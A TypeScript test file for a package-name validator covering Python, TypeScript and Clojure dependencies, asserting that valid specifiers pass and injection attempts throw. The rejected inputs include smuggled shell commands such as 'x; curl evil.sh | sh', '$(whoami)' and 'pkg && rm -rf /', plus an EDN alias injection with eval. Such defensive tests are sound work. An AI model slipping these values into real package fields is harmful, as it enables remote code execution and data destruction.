import assert from 'node:assert';
import { validatePackages } from './validate-packages.ts';

assert.doesNotThrow(() => validatePackages('python', ['numpy', 'numpy==1.26.0']));
assert.throws(() => validatePackages('python', ['numpy>=1.0'])); // ranges rely on shell-meaningful chars
assert.throws(() => validatePackages('python', ['numpy[extra]'])); // extras rely on shell-meaningful chars

assert.doesNotThrow(() =>
	validatePackages('typescript', ['lodash', 'lodash@4.17.21', '@scope/pkg@^1.2.3', '@scope/pkg@~1.2.3'])
);

assert.doesNotThrow(() => validatePackages('clojure', ['hiccup', 'org.clojure/data.json@2.5.0']));
assert.throws(() => validatePackages('clojure', ['pkg} :aliases {:x {:exec-fn eval}}'])); // edn structure injection

for (const language of ['python', 'typescript', 'clojure'] as const) {
	assert.throws(() => validatePackages(language, ['x; curl evil.sh | sh']));
	assert.throws(() => validatePackages(language, ['$(whoami)']));
	assert.throws(() => validatePackages(language, ['pkg `id`']));
	assert.throws(() => validatePackages(language, ['pkg && rm -rf /']));
}

console.log('ok');
